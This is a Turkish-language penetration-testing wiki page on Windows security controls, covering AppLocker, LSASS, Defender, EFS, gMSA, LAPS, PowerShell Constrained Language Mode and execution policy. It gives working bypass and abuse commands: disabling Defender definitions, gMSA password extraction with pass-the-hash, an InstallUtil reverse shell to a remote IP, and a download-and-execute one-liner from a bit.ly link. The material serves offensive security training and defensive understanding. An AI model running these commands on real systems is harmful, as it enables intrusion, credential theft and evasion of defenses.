# Windows Güvenlik Denetimleri

{{#include ../../banners/hacktricks-training.md}}

## AppLocker İlkesi

Uygulama izin listesi, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya yürütülebilir dosyaların listesidir. Amaç, ortamı zararlı yazılımlardan ve kuruluşun belirli iş gereksinimlerine uymayan onaysız yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **uygulama izin listesi çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği üzerinde** denetim sağlar. Yürütülebilir dosyalar, betikler, Windows Installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama yükleyicileri üzerinde **ayrıntılı denetim** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi engellemesi** ve belirli dizinlere yazma erişimini kısıtlaması yaygındır, **ancak bunların tümü atlatılabilir**.

### Kontrol Etme

Hangi dosyaların/uzantıların kara listeye veya beyaz listeye alındığını kontrol edin:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve ilkeleri içerir ve sistemde yürürlükte olan kural kümesini incelemeye olanak tanır:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker ilkesini atlatmak için kullanışlı **yazılabilir klasörler**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyin yürütülmesine izin veriyorsa, **bunu atlatmak** için kullanabileceğiniz **yazılabilir klasörler** vardır.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) binary'ler AppLocker'ı bypass etmek için de yararlı olabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
  - Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** kuralında, herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz ve bu klasöre izin verilir.
  - Kuruluşlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` çalıştırılabilir dosyasını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi [**diğer PowerShell çalıştırılabilir dosyalarının konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gözden kaçırır.
- **DLL enforcement**, sisteme ek yük getirebilmesi ve hiçbir şeyin bozulmadığından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle, **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu **çalıştırmak** ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Kimlik Bilgilerinin Depolanması

### Security Accounts Manager (SAM)

Yerel kimlik bilgileri bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

Bu alt sistemin **kimlik bilgileri** (hash'lenmiş), Single Sign-On amacıyla **belleğinde** **saklanır**.\
**LSA**, yerel **güvenlik politikasını** (parola politikası, kullanıcı izinleri...), **kimlik doğrulamayı**, **erişim belirteçlerini** yönetir...\
Yerel bir oturum açma için **SAM** dosyasındaki sağlanan kimlik bilgilerini **kontrol edecek** ve bir etki alanı kullanıcısının kimliğini doğrulamak için **etki alanı denetleyicisiyle** **iletişim kuracak** olan LSA'dır.

**Kimlik bilgileri**, **LSASS process'i** içinde saklanır: Kerberos biletleri, NT ve LM hash'leri, kolayca çözülebilen parolalar.

### LSA secrets

LSA bazı kimlik bilgilerini diske kaydedebilir:

- Active Directory bilgisayar hesabının parolası (erişilemeyen etki alanı denetleyicisi).
- Windows hizmet hesaplarının parolaları
- Zamanlanmış görevlerin parolaları
- Daha fazlası (IIS uygulamalarının parolaları...)

### NTDS.dit

Active Directory veritabanıdır. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak, bu **korumaları bypass etmenin** yolları vardır.

### Kontrol

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (etkin olup olmadığını anlamak için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu listelemek için şunu da çalıştırabilirsiniz:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypting File System (EFS)

EFS, **File Encryption Key (FEK)** olarak bilinen bir **simetrik anahtar** kullanarak dosyaları şifreler. Bu anahtar, kullanıcının **açık anahtarı** ile şifrelenir ve şifrelenmiş dosyanın $EFS **alternatif veri akışında** saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasına karşılık gelen **özel anahtar**, $EFS akışındaki FEK'in şifresini çözmek için kullanılır. Daha fazla ayrıntı [burada](https://en.wikipedia.org/wiki/Encrypting_File_System) bulunabilir.

**Kullanıcı başlatmadan şifre çözme** senaryoları şunlardır:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS kullanmayan bir dosya sistemine taşındığında otomatik olarak şifreleri çözülür.
- SMB/CIFS protokolü üzerinden ağ aracılığıyla gönderilen şifrelenmiş dosyaların şifreleri, iletilmeden önce çözülür.

Bu şifreleme yöntemi, dosya sahibinin şifrelenmiş dosyalara **şeffaf erişim** sağlamasına olanak tanır. Ancak yalnızca sahibin parolasını değiştirip oturum açmak, dosyaların şifresini çözmeye yetmez.

**Önemli Noktalar**:

- EFS, kullanıcının açık anahtarıyla şifrelenmiş simetrik bir FEK kullanır.
- FEK'e erişmek için kullanıcının özel anahtarıyla şifre çözülür.
- FAT32'ye kopyalama veya ağ üzerinden aktarım gibi belirli koşullarda şifre çözme otomatik olarak gerçekleşir.
- Sahip, şifrelenmiş dosyalara ek bir işlem yapmadan erişebilir.

### EFS bilgilerini kontrol etme

Bir **kullanıcının** bu **hizmeti** **kullanıp kullanmadığını**, şu yolun var olup olmadığını kontrol ederek öğrenin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimin** **erişimi olduğunu** `cipher /c \<file>\` komutuyla kontrol edin.
Ayrıca bir klasör içindeki tüm dosyaları **şifrelemek** ve **şifrelerini çözmek** için `cipher /e` ve `cipher /d` komutlarını kullanabilirsiniz.

### EFS dosyalarının şifresini çözme

#### Authority System olarak çalışmak

Bu yöntem, **kurban kullanıcının** ana bilgisayarda bir **işlem** **çalıştırıyor** olmasını gerektirir. Durum buysa, bir `meterpreter` oturumu kullanarak kullanıcının işleminin belirtecini taklit edebilirsiniz (`incognito` içindeki `impersonate_token`). Alternatif olarak, doğrudan kullanıcının işlemine `migrate` edebilirsiniz.

#### Kullanıcının parolasını bilmek

Mimikatz, parola bilindiğinde kullanıcının sertifika/özel anahtar materyalinin nasıl içe aktarılacağını ve EFS ile korunan dosyaların şifresinin nasıl çözüleceğini belgeliyor.<sup>[[6]](#references)</sup>

## Grup Yönetilen Hizmet Hesapları (gMSA)

Microsoft, BT altyapılarında hizmet hesaplarının yönetimini kolaylaştırmak için **Group Managed Service Accounts (gMSA)** geliştirdi. "**Password never expire**" ayarı genellikle etkin olan geleneksel hizmet hesaplarından farklı olarak gMSA'ler daha güvenli ve kolay yönetilebilir bir çözüm sunar:

- **Otomatik parola yönetimi**: gMSA'ler, etki alanı veya bilgisayar politikasına göre otomatik olarak değişen, 240 karakterlik karmaşık bir parola kullanır. Bu süreç Microsoft'un Key Distribution Service (KDC) tarafından yürütülür ve parolaların elle güncellenmesi ihtiyacını ortadan kaldırır.
- **Gelişmiş güvenlik**: Bu hesaplar kilitlenemez ve etkileşimli oturum açma için kullanılamaz; bu da güvenliklerini artırır.
- **Birden çok ana bilgisayar desteği**: gMSA'ler birden çok ana bilgisayar arasında paylaşılabilir; bu da onları birden çok sunucuda çalışan hizmetler için ideal kılar.
- **Zamanlanmış görev desteği**: Yönetilen hizmet hesaplarından farklı olarak gMSA'ler zamanlanmış görevlerin çalıştırılmasını destekler.
- **Basitleştirilmiş SPN yönetimi**: Bilgisayarın sAMaccount ayrıntılarında veya DNS adında değişiklik olduğunda sistem, Service Principal Name (SPN) bilgisini otomatik olarak güncelleyerek SPN yönetimini kolaylaştırır.

gMSA parolaları LDAP _**msDS-ManagedPassword**_ özelliğinde saklanır ve Domain Controller'lar (DC'ler) tarafından her 30 günde bir otomatik olarak sıfırlanır. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen bu şifrelenmiş veri blob'u yalnızca yetkili yöneticiler ve gMSA'lerin kurulu olduğu sunucular tarafından alınabilir; böylece güvenli bir ortam sağlanır. Bu bilgilere erişmek için LDAPS gibi güvenli bir bağlantı gerekir veya bağlantı 'Sealing & Secure' ile kimlik doğrulamalı olmalıdır.

![gMSA parolasını almak için NTLM kimlik doğrulamasını aktarma](../../images/asd1.png)<sup>[[1]](#references)</sup>

Bu parolayı [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** ile okuyabilirsiniz.<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Arşivlenmiş özgün araştırmada daha fazla bilgi edinin**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Aynı araştırma, **NTLM relay attack** ile relay edilen principal `msDS-ManagedPassword` öğesini okumaya yetkili olduğunda **gMSA password** elde edilebileceğini açıklıyor.<sup>[[1]](#references)</sup>

### gMSA managed password öğesini okumak için ACL chaining'i kötüye kullanma (GenericAll -> ReadGMSAPassword)

Birçok ortamda, düşük ayrıcalıklı kullanıcılar yanlış yapılandırılmış object ACL'lerini kötüye kullanarak DC'yi ele geçirmeden gMSA secrets öğelerine pivot edebilir:<sup>[[3]](#references)</sup>

- Kontrol edebildiğiniz bir gruba (ör. GenericAll/GenericWrite üzerinden) bir gMSA üzerinde `ReadGMSAPassword` izni verilmiştir.
- Kendinizi bu gruba ekleyerek LDAP üzerinden gMSA'nın `msDS-ManagedPassword` blob'unu okuma ve kullanılabilir NTLM credentials türetme hakkını kazanırsınız.

Tipik iş akışı:

1) BloodHound ile yolu bulun ve başlangıç noktası olan principal'larınızı Owned olarak işaretleyin. Şu tür edge'leri arayın:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Kendinizi kontrol ettiğiniz ara gruba ekleyin (bloodyAD ile örnek):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) gMSA yönetilen parolasını LDAP üzerinden okuyup NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword` değerinin çıkarılmasını ve NTLM'ye dönüştürülmesini otomatikleştirir:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) NTLM hash'i kullanarak gMSA olarak kimlik doğrulayın (plaintext gerekmez). Hesap Remote Management Users grubundaysa, WinRM doğrudan çalışır:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Notlar:
- `msDS-ManagedPassword` için LDAP okumalarında sealing gerekir (ör. LDAPS/sign+seal). Araçlar bunu otomatik olarak halleder.
- gMSA'lere genellikle WinRM gibi yerel haklar verilir; yanal hareketi planlamak için grup üyeliğini (ör. Remote Management Users) doğrulayın.
- Blob'a yalnızca NTLM'i kendiniz hesaplamak için ihtiyacınız varsa MSDS-MANAGEDPASSWORD_BLOB yapısına bakın.

Başka bir ACL yolu, gMSA nesnesinin kendisine yazma izni verilmesidir. `msDS-GroupMSAMembership`, yönetilen parolayı hangi principal'ların alabileceğini belirlemek için kullanılan güvenlik tanımlayıcısıdır. Şema GUID'si `888eedd6-ce04-df40-b462-b8a50e41ba38` şeklindedir. Kontrol ettiğiniz bir grup için bu öznitelikteki tam bir `WriteProperty` ACE'si, okuyucu listesini değiştirme adayı olabilir; bu, okuyucu olarak zaten listelenmekten farklıdır. Bu yolu kullanılabilir kabul etmeden önce DACL'nin tamamını, deny ve devralınan ACE'leri ve etkili izinleri doğrulayın. Yeni bir grup üyeliğiyle parola okumayı denemeden önce token/session yenilenmelidir.<sup>[[7]](#references)</sup>



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilen **Local Administrator Password Solution (LAPS)**, yerel Administrator parolalarının yönetilmesini sağlar. **Rastgele oluşturulan**, benzersiz ve **düzenli olarak değiştirilen** bu parolalar, Active Directory'de merkezi olarak saklanır. Bu parolalara erişim, ACL'ler aracılığıyla yetkili kullanıcılarla sınırlandırılır. Yeterli izinler verildiğinde yerel admin parolalarını okuma olanağı sağlanır.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili biçimde kullanmak için gereken birçok özelliği **kısıtlar**; örneğin COM nesnelerini engeller, yalnızca onaylı .NET türlerine izin verir, XAML tabanlı iş akışlarını ve PowerShell sınıflarını engeller.

### **Kontrol Et**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Mevcut Windows sürümlerinde bu bypass artık çalışmıyor, ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** **şunu** yapmanız gerekebilir: _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` dosyasını ekleyin ve projeyi **.Net4.5** olarak değiştirin.

#### Doğrudan bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu çalıştırabilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Çalıştırma İlkesi

Varsayılan olarak **restricted** olarak ayarlanır. Bu ilkeyi bypass etmenin başlıca yolları:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> bulabilirsiniz.

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.

SSPI, iletişim kuran iki makine için uygun bir kimlik doğrulama protokolü seçer ve kullanılabiliyorsa Kerberos'u tercih eder. Bu protokoller, Windows'ta DLL olarak yüklenen Security Support Provider'lar (SSP'ler) tarafından uygulanır; her iki tarafın da üzerinde anlaşmaya varılan sağlayıcıyı desteklemesi gerekir.

### Main SSPs

- **Kerberos**: Tercih edilen protokol
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedeniyle
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için; parola MD5 hash biçimindedir
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü (Kerberos veya NTLM; varsayılan Kerberos'tur) belirlemek için kullanılır
  - %windir%\Windows\System32\lsasrv.dll

#### Anlaşma süreci birden fazla yöntem veya yalnızca bir yöntem sunabilir.

## UAC - Kullanıcı Hesabı Denetimi

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş izin gerektiren etkinlikler için onay istemi** sağlayan bir özelliktir.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSA için relay – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: hak zincirleme ile WinRM üzerinden gMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker ve PowerShell Constrained Language Mode'u atlatma](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policy'yi atlatmanın 15 yolu](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS dosyalarının şifresini çözme](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - ms-DS-GroupMSAMembership özniteliği](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
